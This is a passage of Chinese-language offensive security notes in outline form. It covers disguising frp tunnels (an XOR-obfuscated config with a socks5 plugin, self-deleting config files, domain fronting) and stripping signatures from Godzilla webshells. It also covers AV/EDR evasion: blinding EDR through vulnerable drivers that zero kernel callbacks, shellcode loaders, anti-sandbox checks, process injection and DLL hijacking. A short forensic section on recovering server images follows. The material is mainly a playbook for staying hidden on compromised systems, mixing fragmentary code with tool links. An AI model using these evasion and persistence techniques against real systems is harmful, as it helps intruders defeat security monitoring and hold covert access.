  - [https://hasdata.com/blog/user-agents-for-web-scraping](https://hasdata.com/blog/user-agents-for-web-scraping)
  - User-Agent Switcher and Manager （chrome插件）
- 配置文件自删除
  - 直接硬编码配置到main中
    - func getFileContent(ip string, port string) {	key := "testkey"	ip = str2xor(ip, key)	port = str2xor(port, key)	var configContent string = `[common]        server_addr = ` + ip + `        server_port = ` + port + `	tls_enable = true 	[plugin_socks]	type = tcp	remote_port = 7788	plugin = socks5	#plugin_user = ""	#plugin_passwd = ""	`	fileContent = configContent}
  - if cfg.DELEnable == true { os.Remove(cfgFile) }
- 远程加载配置文件
- tls指纹
  - [https://github.com/sleeyax/burp-awesome-tls](https://github.com/sleeyax/burp-awesome-tls)
  - frp
    - pkg/util/net/tls.go
- 域前置
  - pkg/util/net/websocket.go
  - cdn配置回源为http
- 外联小众协议
  - quic
    - transport.protocol = "quic"quicBindPort = 7000
- protobuf插件
- 自定义加解密
  - chacha20
  - 异或
  - 复杂加密给配置文件和认证、流量包简单加密不然会很卡
- 去掉硬编码
  - salt、json数据
    - 有可能崩溃、动调看好处理逻辑
    - 尤其注意认证部分指纹
      - models/msg/msg.go
  - const (	FrpWebsocketPath = "/~!frp")
- 编译混淆加壳
  - upx
  - garble
  - [https://github.com/boy-hack/go-strip](https://github.com/boy-hack/go-strip)
- dll加载
  - 讲完edr环境搭建去做免杀
- [https://github.com/langsasec/Sign-Sacker](https://github.com/langsasec/Sign-Sacker)
#### 熟悉框架结构

- 框架入口文件
- 目录结构
  - fscan
    - common
      - 数据的解析和结构体以及变量的存储
    - plugins
      - 插件
        - 理解项目结构和开发可以从写插件做起
    - webscan
      - web扫描
        - 框架指纹的识别
        - 框架的调度流程
- 关键函数
  - 正看看整个框架逻辑
    - 改框架
  - 打断点倒看你这里是怎么被调的
    - 改插件
- 动态调试
- 加解密加log输出
#### 检测

- [https://github.com/cmluZw/Situational-Awareness](https://github.com/cmluZw/Situational-Awareness)
- [https://github.com/Qianlitp/WatchAD](https://github.com/Qianlitp/WatchAD)
- [https://github.com/Qihoo360/WatchAD2.0](https://github.com/Qihoo360/WatchAD2.0)
- [https://abyssalfish-os.github.io/](https://abyssalfish-os.github.io/)
- 云态势感知
  - SA
### 哥斯拉特征修改（炮灰入口使用，大型or长期实战建议单独开发shell管理工具）

#### 自定义流量加密

- 去除md5校验
  - core/ApplicationConfig.java
- 去掉http头特征
- /shells/cryptions/*
- 修改key取值为后16位，找到位置在ShellEntity的getSecretKeyX方法和加密类的generate方法修改
#### 需要的工具

- JETBRAIN IDEA
- JETBRAIN RIDER
- ILspy
- sqlitestudio
- vistual studio2022
- 反编译网站得到的源码缺失shell下payload和plugin的assets文件夹中的文件，需要手动放入后重新打包编译
#### 自定义命令执行

- 修改execCommand,复制cmd到临时目录执行并删除
- 修改默认变量名
- 重新编译后替换原来的payload.dll
- 修改ShellExecCommandPanel默认命令代码
- 修改掉默认的命令填充
#### webshell去特征

- 修改反射Load方法名和GetMethod来过特征免杀（java \CSharrp一样）
- 其他变量随意修改过特征免杀
- 根据GenerateShellLoder的填充方式修改同文件夹下template目录下base64.bin
- 修改shell.aspx去掉头尾
- 利用ILspy反编译payload.dll导出源码，修改文件名及类名，bin模板中记得对应修改
#### 插件开发

- 修改打包好的jar包替换掉原始lib中的jar包，成功添加插件
- [https://beichendream.github.io/godzillaApi/](https://beichendream.github.io/godzillaApi/)
- lib添加哥斯拉jar
- 包名必须是以shells.plugins.任意字符为开头
- 新建一个类并声明core.annotation.PluginnAnnotation注解，然后继承并实现core.imp.Plugin接口，开始写功能代码
  - Swing UI设计
- 把弹出菜单注册到不同位置
  - MainActivity.registerJMenu(menu);//注册一个单独的菜单在主页面MainActivity.registerPluginJMenuItem(pluginMenuItem);//注册一个菜单元素在插件菜单栏下MainActivity.registerShellViewJMenuItem(shellViewMenuItem);//注册一个菜单元素在Shell管理主页面的右击弹出菜单中
    - 必须在static静态代码块中完成注册菜单
## **木马免杀 **

### edr 实战环境搭建

#### 趋势

- [https://bbs.kafan.cn/thread-2277040-1-1.html](https://bbs.kafan.cn/thread-2277040-1-1.html)
- [https://github.com/emdnaia/TrendMicroDSAExfil](https://github.com/emdnaia/TrendMicroDSAExfil)
  - qax zero trust有同样问题
#### 赛门铁克

- [https://bbs.kafan.cn/thread-2270682-1-1.html](https://bbs.kafan.cn/thread-2270682-1-1.html)
#### MDE

- 需官方购买安装
  - 改系统区域
#### [https://bbs.kafan.cn/forum-89-1.html](https://bbs.kafan.cn/forum-89-1.html)

- 卡饭论坛下载+教程
#### 咸鱼市场

#### 先安装服务端再安装客户端

- 上线后给虚拟机打镜像
  - 测免杀先断网
  - 如果联网样本被上传需要保证编译时去调调试信息及符号表
### beacon 免杀

#### 白驱动致盲 edr

- 安装开发环境
  - [https://learn.microsoft.com/zh-cn/windows-hardware/drivers/](https://learn.microsoft.com/zh-cn/windows-hardware/drivers/)
    - 先安装sdk
    - 再安装wdk
    - 安装缓解143系列
    - 出现wdm就算成功
- 基础知识
- kill用户态process
  - 终端下线
  - ZwTerminateProcess
    - blackout
      - typedef struct _CLIENT_ID {    HANDLE UniqueProcess;  // 进程句柄    HANDLE UniqueThread;   // 线程句柄} CLIENT_ID;
- 干掉回调
  - ObRegisterCallbacks
    - 打开或者复制特定对象类型的句柄
      - PsProcessType、PsThreadType
        - CallbackList
          - PreOperation \ PostOperation = 0
  - CmRegisterCallback
    - 访问、修改注册表
      - CallbackListHead
        - PEX_CALLBACK_FUNCTION
          - 指向的地址修改为双向链表上已经存在的地址值
          - PG保护会蓝屏
  - MiniFilter
    - 创建/修改/删除文件
      - volume
        - FLT_VOLUMES
          - _CALLBACK_NODE
            - 将首地址直接修改为系统自带的驱动_CALLBACK_NODE 结构地址
  - PsSetCreateProcessNotifyRoutine
    - 进程被创建或销毁
  - PsSetCreateThreadNotifyRoutine
    - 线程被创建或销毁
      - typedef struct _EX_CALLBACK_ROUTINE_BLOCK {    EX_RUNDOWN_REF RundownProtect;    PEX_CALLBACK_FUNCTION Function;    PVOID Context;} EX_CALLBACK_ROUTINE_BLOCK, *PEX_CALLBACK_ROUTINE_BLOCK;
        - [https://reactos.org/](https://reactos.org/)
  - PsSetLoadImageNotifyRoutine
    - 任何Image（EXE、DLL、驱动）文件被加载
- [https://www.loldrivers.io/drivers/](https://www.loldrivers.io/drivers/)
  - [https://github.com/Cr4sh/ioctlfuzzer](https://github.com/Cr4sh/ioctlfuzzer)
    - 内核fuzz工具
      - 打开核心内存转储
  - [https://github.com/koutto/ioctlbf](https://github.com/koutto/ioctlbf)
  - [https://github.com/k0keoyo/kDriver-Fuzzer](https://github.com/k0keoyo/kDriver-Fuzzer)
  - [https://github.com/nccgroup/DIBF](https://github.com/nccgroup/DIBF)
  - [https://github.com/IntelLabs/kAFL](https://github.com/IntelLabs/kAFL)
  - [https://github.com/Z4kSec/IoctlHunter](https://github.com/Z4kSec/IoctlHunter)
  - [https://github.com/0dayResearchLab/msFuzz](https://github.com/0dayResearchLab/msFuzz)
  - [https://github.com/zeze-zeze/ioctlance](https://github.com/zeze-zeze/ioctlance)
- 利用
  - [https://github.com/paysonism/payson-ioctl-cheat-driver](https://github.com/paysonism/payson-ioctl-cheat-driver)
  - [https://github.com/Hagrid29/BYOVDKit](https://github.com/Hagrid29/BYOVDKit)
  - [https://github.com/BlackSnufkin/BYOVD](https://github.com/BlackSnufkin/BYOVD)
#### 加密混淆免杀

- 查杀方式
  - 静态查杀
    - 特征码
      - hash、文件名、函数名、敏感字符串、敏感api...
      - PE文件头信息，导入、导出、TLS，节区信息；shellcode代码信息；shellcodeloader代码信息
    - 云查杀
    - 校验和
      - 不定期检查文件校验和
    - 启发式
      - 机器学习
      - yara
    - 免杀
      - 分段
      - 加解密
        - aes
        - rsa
        - 古典密码
        - .....
      - 编码
        - 异或
        - base64
        - uuid
        - mac
        - ip地址
        - 注册表键值
          - RegQueryValueExA
          - RegQueryValueExA
        - 剪切板读数据
          - RegisterClipboardFormat
          - GetClipboardFormatName
        - .....
      - 变量名混淆
        - [https://pyob.oxyry.com/](https://pyob.oxyry.com/)
      - 控制流混淆
      - 修改无影响的shellcode特征码
        - cs一字节干掉yara
      - 序列化
        - protobuf
        - pickle
      - **将shellcode当成字符串去处理**
      - 分离加载
        - 文件
        - url
      - 动态加载api
        - loadlibrary+getprocaddress
        - fs->TEB、PEB->kernel32.dll->loadlibrary+getprocaddress
        - SSN->syscall
          - [https://j00ru.vexillium.org/syscalls/nt/64/](https://j00ru.vexillium.org/syscalls/nt/64/)
          - #include <unistd.h>
            - syscall(SYS_write, STDOUT_FILENO, message, length);
              - 杀软警告
          - [https://github.com/klezVirus/SysWhispers3](https://github.com/klezVirus/SysWhispers3)
          - [https://github.com/voidvxvt/HellBunny](https://github.com/voidvxvt/HellBunny)
    - 内存加载器
      - 申请可执行内存
        - VirtualProtect
        - VirtualAlloc
        - AllocADsMem
        - ReallocADsMem
        - HeapCreate
      - shellcode写入内存
        - RtlMoveMemory
        - RtlCopyMemory
      - 执行该内存
        - EnumSystemLocalesA
        - CreateThread
        - WaitForSingleObject
      - [https://github.com/0xsp-SRD/ZigStrike](https://github.com/0xsp-SRD/ZigStrike)
      - 函数替换
        - [http://ropgadget.com/posts/abusing_win_functions.html](http://ropgadget.com/posts/abusing_win_functions.html)
      - 加载器内部执行
        - 容易规避杀软的检测
  - 动态查杀
    - 沙箱
    - 内存检测
    - 免杀
      - 反沙箱
        - 开机时间
        - 物理内存
        - cpu个数
        - Tmep文件个数
        - 随机字符串服务器校验
        - usb记录
        - 样本名称
        - 硬盘大小
        - 能否联网
        - 能否使用命名管道
      - 动态内存加载
        - inline hook sleep
          - hook后自定义sleep函数逻辑
        - CreateTimerQueueTimer
      - 远程线程注入
        - CreateRemoteThread
          - OpenProcess
          - VirtualAllocEx
          - WriteProcessMemory
      - APC注入
        - apc+间接系统调用+模块踩踏
        - QueueUserApc
        - Early Bird
      - 自研rat
        - 分离功能
      - dll劫持
        - winsxs dll劫持
        - microsoft组件劫持
          - onedrive
        - dll劫持自动化脚本
      - 回调
        - EnumChildWindows
        - AlternativeShellcodeExec
      - llvm混淆
        - [https://github.com/KomiMoe/Arkari](https://github.com/KomiMoe/Arkari)
      - 打断进程链
        - 3环
          - ldte->InInitializationOrderModuleList.Blink->Flink = ldte->InInitializationOrderModuleList.Flink;
          - ldte->InInitializationOrderModuleList.Flink->Blink = ldte->InInitializationOrderModuleList.Blink;
        - 0环
          - PsActiveProcessHead->Eprocess
      - 注入其他进程
        - 被杀不死加载器
      - 内核注入
        - [https://ti.qianxin.com/blog/articles/The-Nightmare-of-EDR-Storm-0978-Utilizing-New-Kernel-Injection-Technique-Step-Bear-CN/](https://ti.qianxin.com/blog/articles/The-Nightmare-of-EDR-Storm-0978-Utilizing-New-Kernel-Injection-Technique-Step-Bear-CN/)
  - 流量查杀
    - 流量特征
      - 固定通信协议加密字段
        - cobalt strike 的通信协议，是由 RSA 传输 AES 的密钥，AES的密钥加密后续通信
    - 内容特征
      - data字段是否存在命令相关的关键词加密特征
    - 结构特征
      - 固定字段特征
    - ip
## **调证镜像系统还原 **

### linux

#### 恢复镜像

- [https://qemu.weilnetz.de/w64/](https://qemu.weilnetz.de/w64/)
  - qemu-img convert -f raw 要转换的.raw -O vmdk 生成的.vmdk
#### 修改虚拟机配置

- 选使用现用磁盘
#### 修改密码

- 在启动页面选中第一个，按e键进入单用户模式
- 把ro后面的部分全部删掉，改为rw init=/bin/bash
- 删除阿里云cloud init
  - rm -rf $(find / 2>/dev/null|grep cloud-init)
- passwd
  - 修改密码
#### 修改网络

- ip a
- dhclient eth0
- 网络选择仅主机
#### 查看历史命令

#### 查看服务

#### 服务对应文件

## hw
